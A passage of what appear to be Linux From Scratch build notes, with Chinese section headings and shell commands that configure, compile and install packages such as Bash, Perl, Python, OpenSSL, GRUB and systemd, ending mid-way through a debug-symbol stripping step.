--with-cxx-shared       \\\r\n            --enable-pc-files       \\\r\n            --enable-widec          \\\r\n            --with-pkg-config-libdir=/usr/lib/pkgconfig\r\n            \r\nmake\r\n\r\nmake DESTDIR=$PWD/dest install\r\ninstall -vm755 dest/usr/lib/libncursesw.so.6.4 /usr/lib\r\nrm -v  dest/usr/lib/libncursesw.so.6.4\r\nsed -e \'s/^#if.*XOPEN.*$/#if 1/\' \\\r\n    -i dest/usr/include/curses.h\r\ncp -av dest/* /\r\n\r\nfor lib in ncurses form panel menu ; do\r\n    ln -sfv lib${lib}w.so /usr/lib/lib${lib}.so\r\n    ln -sfv ${lib}w.pc    /usr/lib/pkgconfig/${lib}.pc\r\ndone\r\n\r\nln -sfv libncursesw.so /usr/lib/libcurses.so\r\n\r\ncp -v -R doc -T /usr/share/doc/ncurses-6.4-20230520\r\n\r\ncd /sources\r\nrm -rf ncurses-6.4-20230520\r\n```\r\n\r\n#### Sed-4.9\r\n\r\n```sh\r\ncd /sources\r\ntar -xf sed-4.9.tar.xz\r\ncd sed-4.9\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake html\r\n\r\nmake install\r\ninstall -d -m755           /usr/share/doc/sed-4.9\r\ninstall -m644 doc/sed.html /usr/share/doc/sed-4.9\r\n\r\ncd /sources\r\nrm -rf sed-4.9\r\n```\r\n\r\n#### Psmisc-23.6\r\n\r\n```sh\r\ncd /sources\r\ntar -xf psmisc-23.6.tar.xz\r\ncd psmisc-23.6\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf psmisc-23.6\r\n```\r\n\r\n#### Gettext-0.22.4\r\n\r\n```sh\r\ncd /sources\r\ntar -xf gettext-0.22.4.tar.xz\r\ncd gettext-0.22.4\r\n\r\n./configure --prefix=/usr    \\\r\n            --disable-static \\\r\n            --docdir=/usr/share/doc/gettext-0.22.4\r\n            \r\nmake\r\nmake install\r\nchmod -v 0755 /usr/lib/preloadable_libintl.so\r\n\r\ncd /sources\r\nrm -rf gettext-0.22.4\r\n```\r\n\r\n#### Bison-3.8.2\r\n\r\n```sh\r\ncd /sources\r\ntar -xf bison-3.8.2.tar.xz \r\ncd bison-3.8.2\r\n\r\n./configure --prefix=/usr --docdir=/usr/share/doc/bison-3.8.2\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf bison-3.8.2\r\n```\r\n\r\n#### Grep-3.11\r\n\r\n```sh\r\ncd /sources\r\ntar -xf grep-3.11.tar.xz \r\ncd grep-3.11\r\n\r\nsed -i \"s/echo/#echo/\" src/egrep.sh\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf grep-3.11\r\n```\r\n\r\n#### Bash-5.2.21\r\n\r\n```sh\r\ncd /sources\r\ntar -xf bash-5.2.21.tar.gz \r\ncd bash-5.2.21\r\n\r\npatch -Np1 -i ../bash-5.2.21-upstream_fixes-1.patch\r\n\r\n./configure --prefix=/usr             \\\r\n            --without-bash-malloc     \\\r\n            --with-installed-readline \\\r\n            --docdir=/usr/share/doc/bash-5.2.21\r\n            \r\nmake\r\nmake install\r\nexec /usr/bin/bash --login\r\n\r\ncd /sources\r\nrm -rf bash-5.2.21\r\n```\r\n\r\n#### Libtool-2.4.7\r\n\r\n```sh\r\ncd /sources\r\ntar -xf libtool-2.4.7.tar.xz \r\ncd libtool-2.4.7\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\nrm -fv /usr/lib/libltdl.a\r\n\r\ncd /sources\r\nrm -rf libtool-2.4.7\r\n```\r\n\r\n#### GDBM-1.23\r\n\r\n```sh\r\ncd /sources\r\ntar -xf gdbm-1.23.tar.gz \r\ncd gdbm-1.23\r\n\r\n./configure --prefix=/usr    \\\r\n            --disable-static \\\r\n            --enable-libgdbm-compat\r\n            \r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf gdbm-1.23\r\n```\r\n\r\n#### Gperf-3.1\r\n\r\n```sh\r\ncd /sources\r\ntar -xf gperf-3.1.tar.gz \r\ncd gperf-3.1\r\n\r\n./configure --prefix=/usr --docdir=/usr/share/doc/gperf-3.1\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf gperf-3.1\r\n```\r\n\r\n#### Expat-2.6.0\r\n\r\n```sh\r\ncd /sources\r\ntar -xf expat-2.6.0.tar.xz \r\ncd expat-2.6.0\r\n\r\n./configure --prefix=/usr    \\\r\n            --disable-static \\\r\n            --docdir=/usr/share/doc/expat-2.6.0\r\n    \r\nmake\r\nmake install\r\ninstall -v -m644 doc/*.{html,css} /usr/share/doc/expat-2.6.0\r\n\r\ncd /sources\r\nrm -rf expat-2.6.0\r\n```\r\n\r\n#### Inetutils-2.5\r\n\r\n```sh\r\ncd /sources\r\ntar -xf inetutils-2.5.tar.xz \r\ncd inetutils-2.5\r\n\r\n./configure --prefix=/usr        \\\r\n            --bindir=/usr/bin    \\\r\n            --localstatedir=/var \\\r\n            --disable-logger     \\\r\n            --disable-whois      \\\r\n            --disable-rcp        \\\r\n            --disable-rexec      \\\r\n            --disable-rlogin     \\\r\n            --disable-rsh        \\\r\n            --disable-servers\r\n            \r\nmake\r\nmake install\r\nmv -v /usr/{,s}bin/ifconfig\r\n\r\ncd /sources\r\nrm -rf inetutils-2.5\r\n```\r\n\r\n#### Less-643\r\n\r\n```sh\r\ncd /sources\r\ntar -xf less-643.tar.gz \r\ncd less-643\r\n\r\n./configure --prefix=/usr --sysconfdir=/etc\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf less-643\r\n```\r\n\r\n#### Perl-5.38.2\r\n\r\n```sh\r\ncd /sources\r\ntar -xf perl-5.38.2.tar.xz \r\ncd perl-5.38.2\r\n\r\nexport BUILD_ZLIB=False\r\nexport BUILD_BZIP2=0\r\n\r\nsh Configure -des                                         \\\r\n             -Dprefix=/usr                                \\\r\n             -Dvendorprefix=/usr                          \\\r\n             -Dprivlib=/usr/lib/perl5/5.38/core_perl      \\\r\n             -Darchlib=/usr/lib/perl5/5.38/core_perl      \\\r\n             -Dsitelib=/usr/lib/perl5/5.38/site_perl      \\\r\n             -Dsitearch=/usr/lib/perl5/5.38/site_perl     \\\r\n             -Dvendorlib=/usr/lib/perl5/5.38/vendor_perl  \\\r\n             -Dvendorarch=/usr/lib/perl5/5.38/vendor_perl \\\r\n             -Dman1dir=/usr/share/man/man1                \\\r\n             -Dman3dir=/usr/share/man/man3                \\\r\n             -Dpager=\"/usr/bin/less -isR\"                 \\\r\n             -Duseshrplib                                 \\\r\n             -Dusethreads\r\n             \r\nmake\r\nmake install\r\nunset BUILD_ZLIB BUILD_BZIP2\r\n\r\ncd /sources\r\nrm -rf perl-5.38.2\r\n```\r\n\r\n#### XML::Parser-2.47\r\n\r\n```sh\r\ncd /sources\r\ntar -xf XML-Parser-2.47.tar.gz \r\ncd XML-Parser-2.47\r\n\r\nperl Makefile.PL\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf XML-Parser-2.47\r\n```\r\n\r\n#### Intltool-0.51.0\r\n\r\n```sh\r\ncd /sources\r\ntar -xf intltool-0.51.0.tar.gz \r\ncd intltool-0.51.0\r\n\r\nsed -i \'s:\\\\\\${:\\\\\\$\\\\{:\' intltool-update.in\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\ninstall -v -Dm644 doc/I18N-HOWTO /usr/share/doc/intltool-0.51.0/I18N-HOWTO\r\n\r\ncd /sources\r\nrm -rf intltool-0.51.0\r\n```\r\n\r\n#### Autoconf-2.72\r\n\r\n```sh\r\ncd /sources\r\ntar -xf autoconf-2.72.tar.xz \r\ncd autoconf-2.72\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf autoconf-2.72\r\n```\r\n\r\n#### Automake-1.16.5\r\n\r\n```sh\r\ncd /sources\r\ntar -xf automake-1.16.5.tar.xz \r\ncd automake-1.16.5\r\n\r\n./configure --prefix=/usr --docdir=/usr/share/doc/automake-1.16.5\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf automake-1.16.5\r\n```\r\n\r\n#### OpenSSL-3.2.1\r\n\r\n```sh\r\ncd /sources\r\ntar -xf openssl-3.2.1.tar.gz \r\ncd openssl-3.2.1\r\n\r\n./config --prefix=/usr         \\\r\n         --openssldir=/etc/ssl \\\r\n         --libdir=lib          \\\r\n         shared                \\\r\n         zlib-dynamic\r\n         \r\nmake\r\nsed -i \'/INSTALL_LIBS/s/libcrypto.a libssl.a//\' Makefile\r\nmake MANSUFFIX=ssl install\r\n\r\nmv -v /usr/share/doc/openssl /usr/share/doc/openssl-3.2.1\r\ncp -vfr doc/* /usr/share/doc/openssl-3.2.1\r\n\r\ncd /sources\r\nrm -rf openssl-3.2.1\r\n```\r\n\r\n#### Kmod-31\r\n\r\n```sh\r\ncd /sources\r\ntar -xf kmod-31.tar.xz \r\ncd kmod-31\r\n\r\n./configure --prefix=/usr          \\\r\n            --sysconfdir=/etc      \\\r\n            --with-openssl         \\\r\n            --with-xz              \\\r\n            --with-zstd            \\\r\n            --with-zlib\r\n            \r\nmake\r\nmake install\r\n\r\nfor target in depmod insmod modinfo modprobe rmmod; do\r\n  ln -sfv ../bin/kmod /usr/sbin/$target\r\ndone\r\n\r\nln -sfv kmod /usr/bin/lsmod\r\n\r\ncd /sources\r\nrm -rf kmod-31\r\n```\r\n\r\n#### Elfutils-0.190 中的 Libelf\r\n\r\n```sh\r\ncd /sources\r\ntar -xf elfutils-0.190.tar.bz2 \r\ncd elfutils-0.190\r\n\r\n./configure --prefix=/usr                \\\r\n            --disable-debuginfod         \\\r\n            --enable-libdebuginfod=dummy\r\n            \r\nmake\r\nmake -C libelf install\r\ninstall -vm644 config/libelf.pc /usr/lib/pkgconfig\r\nrm /usr/lib/libelf.a\r\n\r\ncd /sources\r\nrm -rf elfutils-0.190\r\n```\r\n\r\n#### Libffi-3.4.4\r\n\r\n```sh\r\ncd /sources\r\ntar -xf libffi-3.4.4.tar.gz \r\ncd libffi-3.4.4\r\n\r\n./configure --prefix=/usr          \\\r\n            --disable-static       \\\r\n            --with-gcc-arch=native\r\n            \r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf libffi-3.4.4\r\n```\r\n\r\n#### Python-3.12.2\r\n\r\n```sh\r\ncd /sources\r\ntar -xf Python-3.12.2.tar.xz \r\ncd Python-3.12.2\r\n\r\n./configure --prefix=/usr        \\\r\n            --enable-shared      \\\r\n            --with-system-expat  \\\r\n            --enable-optimizations\r\n            \r\nmake\r\nmake install\r\n\r\ncat > /etc/pip.conf << EOF\r\n[global]\r\nroot-user-action = ignore\r\ndisable-pip-version-check = true\r\nEOF\r\n\r\ninstall -v -dm755 /usr/share/doc/python-3.12.2/html\r\n\r\ntar --no-same-owner \\\r\n    -xvf ../python-3.12.2-docs-html.tar.bz2\r\ncp -R --no-preserve=mode python-3.12.2-docs-html/* \\\r\n    /usr/share/doc/python-3.12.2/html\r\n    \r\ncd /sources\r\nrm -rf Python-3.12.2\r\n```\r\n\r\n#### Flit-Core-3.9.0\r\n\r\n```sh\r\ncd /sources\r\ntar -xf flit_core-3.9.0.tar.gz \r\ncd flit_core-3.9.0\r\n\r\npip3 wheel -w dist --no-cache-dir --no-build-isolation --no-deps $PWD\r\n\r\npip3 install --no-index --no-user --find-links dist flit_core\r\n\r\ncd /sources\r\nrm -rf flit_core-3.9.0\r\n```\r\n\r\n#### Wheel-0.42.0\r\n\r\n```sh\r\ncd /sources\r\ntar -xf wheel-0.42.0.tar.gz \r\ncd wheel-0.42.0\r\n\r\npip3 wheel -w dist --no-cache-dir --no-build-isolation --no-deps $PWD\r\n\r\npip3 install --no-index --find-links=dist wheel\r\n\r\ncd /sources\r\nrm -rf wheel-0.42.0\r\n```\r\n\r\n#### Setuptools-69.1.0\r\n\r\n```sh\r\ncd /sources\r\ntar -xf setuptools-69.1.0.tar.gz \r\ncd setuptools-69.1.0\r\n\r\npip3 wheel -w dist --no-cache-dir --no-build-isolation --no-deps $PWD\r\n\r\npip3 install --no-index --find-links dist setuptools\r\n\r\ncd /sources\r\nrm -rf setuptools-69.1.0\r\n```\r\n\r\n#### Ninja-1.11.1\r\n\r\n```sh\r\ncd /sources\r\ntar -xf ninja-1.11.1.tar.gz \r\ncd ninja-1.11.1\r\n\r\nexport NINJAJOBS=4\r\n\r\nsed -i \'/int Guess/a \\\r\n  int   j = 0;\\\r\n  char* jobs = getenv( \"NINJAJOBS\" );\\\r\n  if ( jobs != NULL ) j = atoi( jobs );\\\r\n  if ( j > 0 ) return j;\\\r\n\' src/ninja.cc\r\n\r\npython3 configure.py --bootstrap\r\n\r\ninstall -vm755 ninja /usr/bin/\r\ninstall -vDm644 misc/bash-completion /usr/share/bash-completion/completions/ninja\r\ninstall -vDm644 misc/zsh-completion  /usr/share/zsh/site-functions/_ninja\r\n\r\ncd /sources\r\nrm -rf ninja-1.11.1\r\n```\r\n\r\n#### Meson-1.3.2\r\n\r\n```sh\r\ncd /sources\r\ntar -xf meson-1.3.2.tar.gz \r\ncd meson-1.3.2\r\n\r\npip3 wheel -w dist --no-cache-dir --no-build-isolation --no-deps $PWD\r\n\r\npip3 install --no-index --find-links dist meson\r\ninstall -vDm644 data/shell-completions/bash/meson /usr/share/bash-completion/completions/meson\r\ninstall -vDm644 data/shell-completions/zsh/_meson /usr/share/zsh/site-functions/_meson\r\n\r\ncd /sources\r\nrm -rf meson-1.3.2\r\n```\r\n\r\n#### Coreutils-9.4\r\n\r\n```sh\r\ncd /sources\r\ntar -xf coreutils-9.4.tar.xz \r\ncd coreutils-9.4\r\n\r\npatch -Np1 -i ../coreutils-9.4-i18n-1.patch\r\n\r\nsed -e \'/n_out += n_hold/,+4 s|.*bufsize.*|//&|\' \\\r\n    -i src/split.c\r\n    \r\nautoreconf -fiv\r\nFORCE_UNSAFE_CONFIGURE=1 ./configure \\\r\n            --prefix=/usr            \\\r\n            --enable-no-install-program=kill,uptime\r\n            \r\nmake\r\nmake install\r\n\r\nmv -v /usr/bin/chroot /usr/sbin\r\nmv -v /usr/share/man/man1/chroot.1 /usr/share/man/man8/chroot.8\r\nsed -i \'s/\"1\"/\"8\"/\' /usr/share/man/man8/chroot.8\r\n\r\ncd /sources\r\nrm -rf coreutils-9.4\r\n```\r\n\r\n#### Check-0.15.2\r\n\r\n```sh\r\ncd /sources\r\ntar -xf check-0.15.2.tar.gz \r\ncd check-0.15.2\r\n\r\n./configure --prefix=/usr --disable-static\r\n\r\nmake\r\nmake docdir=/usr/share/doc/check-0.15.2 install\r\n\r\ncd /sources\r\nrm -rf check-0.15.2\r\n```\r\n\r\n#### Diffutils-3.10\r\n\r\n```sh\r\ncd /sources\r\ntar -xf diffutils-3.10.tar.xz \r\ncd diffutils-3.10\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf diffutils-3.10\r\n```\r\n\r\n#### Gawk-5.3.0\r\n\r\n```sh\r\ncd /sources\r\ntar -xf gawk-5.3.0.tar.xz \r\ncd gawk-5.3.0\r\n\r\nsed -i \'s/extras//\' Makefile.in\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nrm -f /usr/bin/gawk-5.3.0\r\nmake install\r\n\r\nln -sv gawk.1 /usr/share/man/man1/awk.1\r\nmkdir -pv /usr/share/doc/gawk-5.3.0\r\ncp -v doc/{awkforai.txt,*.{eps,pdf,jpg}} /usr/share/doc/gawk-5.3.0\r\n\r\ncd /sources\r\nrm -rf gawk-5.3.0\r\n```\r\n\r\n#### Findutils-4.9.0\r\n\r\n```sh\r\ncd /sources\r\ntar -xf findutils-4.9.0.tar.xz \r\ncd findutils-4.9.0\r\n\r\n./configure --prefix=/usr --localstatedir=/var/lib/locate\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf findutils-4.9.0\r\n```\r\n\r\n#### Groff-1.23.0\r\n\r\n```sh\r\ncd /sources\r\ntar -xf groff-1.23.0.tar.gz \r\ncd groff-1.23.0\r\n\r\nPAGE=A4 ./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf groff-1.23.0\r\n```\r\n\r\n#### efivar-39\r\n\r\n```sh\r\ncd /sources\r\ntar -xf efivar-39.tar.gz \r\ncd efivar-39\r\n\r\nmake\r\nmake install LIBDIR=/usr/lib\r\n\r\ncd /sources\r\nrm -rf efivar-39\r\n```\r\n\r\n#### Popt-1.19\r\n\r\n```sh\r\ncd /sources\r\ntar -xf popt-1.19.tar.gz \r\ncd popt-1.19\r\n\r\n./configure --prefix=/usr --disable-static &&\r\nmake\r\n\r\nmake install\r\n\r\ncd /sources\r\nrm -rf popt-1.19\r\n```\r\n\r\n#### efibootmgr-18\r\n\r\n```sh\r\ncd /sources\r\ntar -xf efibootmgr-18.tar.gz \r\ncd efibootmgr-18\r\n\r\nmake EFIDIR=LFS EFI_LOADER=grubx64.efi\r\n\r\nmake install EFIDIR=LFS\r\n\r\ncd /sources\r\nrm -rf efibootmgr-18\r\n```\r\n\r\n#### 用于EFI的GRUB-2.12\r\n\r\n```sh\r\ncd /sources\r\ntar -xf grub-2.12.tar.xz \r\ncd grub-2.12\r\n\r\nunset {C,CPP,CXX,LD}FLAGS\r\n\r\necho depends bli part_gpt > grub-core/extra_deps.lst\r\n\r\n./configure --prefix=/usr        \\\r\n            --sysconfdir=/etc    \\\r\n            --disable-efiemu     \\\r\n            --with-platform=efi  \\\r\n            --target=x86_64      \\\r\n            --disable-werror     &&\r\nunset TARGET_CC &&\r\nmake\r\n\r\nmake install &&\r\nmv -v /etc/bash_completion.d/grub /usr/share/bash-completion/completions\r\n\r\ncd /sources\r\nrm -rf grub-2.12\r\n```\r\n\r\n#### Gzip-1.13\r\n\r\n```sh\r\ncd /sources\r\ntar -xf gzip-1.13.tar.xz \r\ncd gzip-1.13\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf gzip-1.13\r\n```\r\n\r\n#### IPRoute2-6.7.0\r\n\r\n```sh\r\ncd /sources\r\ntar -xf iproute2-6.7.0.tar.xz \r\ncd iproute2-6.7.0\r\n\r\nsed -i /ARPD/d Makefile\r\nrm -fv man/man8/arpd.8\r\n\r\nmake NETNS_RUN_DIR=/run/netns\r\nmake SBINDIR=/usr/sbin install\r\n\r\nmkdir -pv             /usr/share/doc/iproute2-6.7.0\r\ncp -v COPYING README* /usr/share/doc/iproute2-6.7.0\r\n\r\ncd /sources\r\nrm -rf iproute2-6.7.0\r\n```\r\n\r\n#### Kbd-2.6.4\r\n\r\n```sh\r\ncd /sources\r\ntar -xf kbd-2.6.4.tar.xz \r\ncd kbd-2.6.4\r\n\r\npatch -Np1 -i ../kbd-2.6.4-backspace-1.patch\r\n\r\nsed -i \'/RESIZECONS_PROGS=/s/yes/no/\' configure\r\nsed -i \'s/resizecons.8 //\' docs/man/man8/Makefile.in\r\n\r\n./configure --prefix=/usr --disable-vlock\r\n\r\nmake\r\nmake install\r\n\r\ncp -R -v docs/doc -T /usr/share/doc/kbd-2.6.4\r\n\r\ncd /sources\r\nrm -rf kbd-2.6.4\r\n```\r\n\r\n#### Libpipeline-1.5.7\r\n\r\n```sh\r\ncd /sources\r\ntar -xf libpipeline-1.5.7.tar.gz \r\ncd libpipeline-1.5.7\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf libpipeline-1.5.7\r\n```\r\n\r\n#### Make-4.4.1\r\n\r\n```sh\r\ncd /sources\r\ntar -xf make-4.4.1.tar.gz \r\ncd make-4.4.1\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf make-4.4.1\r\n```\r\n\r\n#### Patch-2.7.6\r\n\r\n```sh\r\ncd /sources\r\ntar -xf patch-2.7.6.tar.xz \r\ncd patch-2.7.6\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf patch-2.7.6\r\n```\r\n\r\n#### Tar-1.35\r\n\r\n```sh\r\ncd /sources\r\ntar -xf tar-1.35.tar.xz \r\ncd tar-1.35\r\n\r\nFORCE_UNSAFE_CONFIGURE=1  \\\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\nmake -C doc install-html docdir=/usr/share/doc/tar-1.35\r\n\r\ncd /sources\r\nrm -rf tar-1.35\r\n```\r\n\r\n#### Texinfo-7.1\r\n\r\n```sh\r\ncd /sources\r\ntar -xf texinfo-7.1.tar.xz \r\ncd texinfo-7.1\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\nmake TEXMF=/usr/share/texmf install-tex\r\n\r\npushd /usr/share/info\r\n  rm -v dir\r\n  for f in *\r\n    do install-info $f dir 2>/dev/null\r\n  done\r\npopd\r\n\r\ncd /sources\r\nrm -rf texinfo-7.1\r\n```\r\n\r\n#### Vim-9.1.0041\r\n\r\n```sh\r\ncd /sources\r\ntar -xf vim-9.1.0041.tar.gz \r\ncd vim-9.1.0041\r\n\r\necho \'#define SYS_VIMRC_FILE \"/etc/vimrc\"\' >> src/feature.h\r\n\r\n./configure --prefix=/usr\r\n\r\nmake\r\nmake install\r\n\r\nln -sv vim /usr/bin/vi\r\nfor L in  /usr/share/man/{,*/}man1/vim.1; do\r\n    ln -sv vim.1 $(dirname $L)/vi.1\r\ndone\r\n\r\nln -sv ../vim/vim91/doc /usr/share/doc/vim-9.1.0041\r\n\r\ncat > /etc/vimrc << \"EOF\"\r\n\" Begin /etc/vimrc\r\n\r\n\" Ensure defaults are set before customizing settings, not after\r\nsource $VIMRUNTIME/defaults.vim\r\nlet skip_defaults_vim=1\r\n\r\nset nocompatible\r\nset backspace=2\r\nset mouse=\r\nsyntax on\r\nif (&term == \"xterm\") || (&term == \"putty\")\r\n  set background=dark\r\nendif\r\n\r\n\" End /etc/vimrc\r\nEOF\r\n\r\ncd /sources\r\nrm -rf vim-9.1.0041\r\n```\r\n\r\n#### MarkupSafe-2.1.5\r\n\r\n```sh\r\ncd /sources\r\ntar -xf MarkupSafe-2.1.5.tar.gz \r\ncd MarkupSafe-2.1.5\r\n\r\npip3 wheel -w dist --no-cache-dir --no-build-isolation --no-deps $PWD\r\npip3 install --no-index --no-user --find-links dist Markupsafe\r\n\r\ncd /sources\r\nrm -rf MarkupSafe-2.1.5\r\n```\r\n\r\n#### Jinja2-3.1.3\r\n\r\n```sh\r\ncd /sources\r\ntar -xf Jinja2-3.1.3.tar.gz \r\ncd Jinja2-3.1.3\r\n\r\npip3 wheel -w dist --no-cache-dir --no-build-isolation --no-deps $PWD\r\npip3 install --no-index --no-user --find-links dist Jinja2\r\n\r\ncd /sources\r\nrm -rf Jinja2-3.1.3\r\n```\r\n\r\n#### Systemd-255\r\n\r\n```sh\r\ncd /sources\r\ntar -xf systemd-255.tar.gz \r\ncd systemd-255\r\n\r\nsed -i -e \'s/GROUP=\"render\"/GROUP=\"video\"/\' \\\r\n       -e \'s/GROUP=\"sgx\", //\' rules.d/50-udev-default.rules.in\r\n       \r\npatch -Np1 -i ../systemd-255-upstream_fixes-1.patch\r\n\r\nmkdir -p build\r\ncd       build\r\n\r\nmeson setup \\\r\n      --prefix=/usr                 \\\r\n      --buildtype=release           \\\r\n      -Ddefault-dnssec=no           \\\r\n      -Dfirstboot=false             \\\r\n      -Dinstall-tests=false         \\\r\n      -Dldconfig=false              \\\r\n      -Dsysusers=false              \\\r\n      -Drpmmacrosdir=no             \\\r\n      -Dhomed=disabled              \\\r\n      -Duserdb=false                \\\r\n      -Dman=disabled                \\\r\n      -Dmode=release                \\\r\n      -Dpamconfdir=no               \\\r\n      -Ddev-kvm-mode=0660           \\\r\n      -Dnobody-group=nogroup        \\\r\n      -Dsysupdate=disabled          \\\r\n      -Dukify=disabled              \\\r\n      -Ddocdir=/usr/share/doc/systemd-255 \\\r\n      ..\r\n      \r\nninja\r\nninja install\r\n\r\ntar -xf ../../systemd-man-pages-255.tar.xz \\\r\n    --no-same-owner --strip-components=1   \\\r\n    -C /usr/share/man\r\n    \r\nsystemd-machine-id-setup\r\nsystemctl preset-all\r\n\r\ncd /sources\r\nrm -rf systemd-255\r\n```\r\n\r\n#### D-Bus-1.14.10\r\n\r\n```sh\r\ncd /sources\r\ntar -xf dbus-1.14.10.tar.xz \r\ncd dbus-1.14.10\r\n\r\n./configure --prefix=/usr                        \\\r\n            --sysconfdir=/etc                    \\\r\n            --localstatedir=/var                 \\\r\n            --runstatedir=/run                   \\\r\n            --enable-user-session                \\\r\n            --disable-static                     \\\r\n            --disable-doxygen-docs               \\\r\n            --disable-xml-docs                   \\\r\n            --docdir=/usr/share/doc/dbus-1.14.10 \\\r\n            --with-system-socket=/run/dbus/system_bus_socket\r\n            \r\nmake\r\nmake install\r\n\r\nln -sfv /etc/machine-id /var/lib/dbus\r\n\r\ncd /sources\r\nrm -rf dbus-1.14.10\r\n```\r\n\r\n#### Man-DB-2.12.0\r\n\r\n```sh\r\ncd /sources\r\ntar -xf man-db-2.12.0.tar.xz \r\ncd man-db-2.12.0\r\n\r\n./configure --prefix=/usr                         \\\r\n            --docdir=/usr/share/doc/man-db-2.12.0 \\\r\n            --sysconfdir=/etc                     \\\r\n            --disable-setuid                      \\\r\n            --enable-cache-owner=bin              \\\r\n            --with-browser=/usr/bin/lynx          \\\r\n            --with-vgrind=/usr/bin/vgrind         \\\r\n            --with-grap=/usr/bin/grap\r\n            \r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf man-db-2.12.0\r\n```\r\n\r\n#### Procps-ng-4.0.4\r\n\r\n```sh\r\ncd /sources\r\ntar -xf procps-ng-4.0.4.tar.xz \r\ncd procps-ng-4.0.4\r\n\r\n./configure --prefix=/usr                           \\\r\n            --docdir=/usr/share/doc/procps-ng-4.0.4 \\\r\n            --disable-static                        \\\r\n            --disable-kill                          \\\r\n            --with-systemd\r\n            \r\nmake src_w_LDADD=\'$(LDADD) -lsystemd\'\r\nmake install\r\n\r\ncd /sources\r\nrm -rf procps-ng-4.0.4\r\n```\r\n\r\n#### Util-linux-2.39.3\r\n\r\n```sh\r\ncd /sources\r\ntar -xf util-linux-2.39.3.tar.xz \r\ncd util-linux-2.39.3\r\n\r\nsed -i \'/test_mkfds/s/^/#/\' tests/helpers/Makemodule.am\r\n\r\n./configure --bindir=/usr/bin    \\\r\n            --libdir=/usr/lib    \\\r\n            --runstatedir=/run   \\\r\n            --sbindir=/usr/sbin  \\\r\n            --disable-chfn-chsh  \\\r\n            --disable-login      \\\r\n            --disable-nologin    \\\r\n            --disable-su         \\\r\n            --disable-setpriv    \\\r\n            --disable-runuser    \\\r\n            --disable-pylibmount \\\r\n            --disable-static     \\\r\n            --without-python     \\\r\n            ADJTIME_PATH=/var/lib/hwclock/adjtime \\\r\n            --docdir=/usr/share/doc/util-linux-2.39.3\r\n            \r\nmake\r\nmake install\r\n\r\ncd /sources\r\nrm -rf util-linux-2.39.3\r\n```\r\n\r\n#### E2fsprogs-1.47.0\r\n\r\n```sh\r\ncd /sources\r\ntar -xf e2fsprogs-1.47.0.tar.gz \r\ncd e2fsprogs-1.47.0\r\n\r\nmkdir -v build\r\ncd build\r\n\r\n../configure --prefix=/usr           \\\r\n             --sysconfdir=/etc       \\\r\n             --enable-elf-shlibs     \\\r\n             --disable-libblkid      \\\r\n             --disable-libuuid       \\\r\n             --disable-uuidd         \\\r\n             --disable-fsck\r\n             \r\nmake\r\nmake install\r\n\r\nrm -fv /usr/lib/{libcom_err,libe2p,libext2fs,libss}.a\r\n\r\ngunzip -v /usr/share/info/libext2fs.info.gz\r\ninstall-info --dir-file=/usr/share/info/dir /usr/share/info/libext2fs.info\r\n\r\nmakeinfo -o      doc/com_err.info ../lib/et/com_err.texinfo\r\ninstall -v -m644 doc/com_err.info /usr/share/info\r\ninstall-info --dir-file=/usr/share/info/dir /usr/share/info/com_err.info\r\n\r\nsed \'s/metadata_csum_seed,//\' -i /etc/mke2fs.conf\r\n\r\ncd /sources\r\nrm -rf e2fsprogs-1.47.0\r\n```\r\n\r\n#### 移除调试符号（可选）\r\n\r\n```sh\r\nsave_usrlib=\"$(cd /usr/lib; ls ld-linux*[^g])\r\n             libc.so.6\r\n             libthread_db.so.1\r\n             libquadmath.so.0.0.0\r\n             libstdc++.so.6.0.32\r\n             libitm.so.1.0.0\r\n             libatomic.so.1.2.0\"\r\n\r\ncd /usr/lib\r\n\r\nfor LIB in $save_usrlib; do\r\n    objcopy --only-keep-debug --compress-debug-sections=zlib $LIB $LIB.dbg\r\n    cp $LIB /tmp/$LIB\r\n    strip --strip-unneeded /tmp/$LIB\r\n    objcopy --add-gnu-debuglink=$LIB.dbg /tmp/$LIB\r\n    install -vm755 /tmp/$LIB /usr/lib\r\n    rm /tmp/$LIB\r\ndone\r\n\r\nonline_usrbin=\"bash find strip\"\r\nonline_usrlib=\"libbfd-2.42.so\r\n               libsframe.so.1.0.0\r\n               libhistory.so.8.2\r\n               libncursesw.so.6.4-20230520\r\n               libm.so.6\r\n               libreadline.so.8.2\r\n               libz.so.1.3.1\r\n               libzstd.so.1.5.5\r\n               $(cd /usr/lib; find libnss*.so* -type f)\"\r\n\r\nfor BIN in $online_usrbin; do\r\n    cp /usr/bin/$BIN /tmp/$BIN\r\n    strip --strip-unneeded /tmp/$BIN\r\n    install -vm755 /tmp/$BIN /usr/bin\r\n    rm /tmp/$BIN\r\ndone\r\n\r\nfor LIB in $online_usrlib; do\r\n    cp 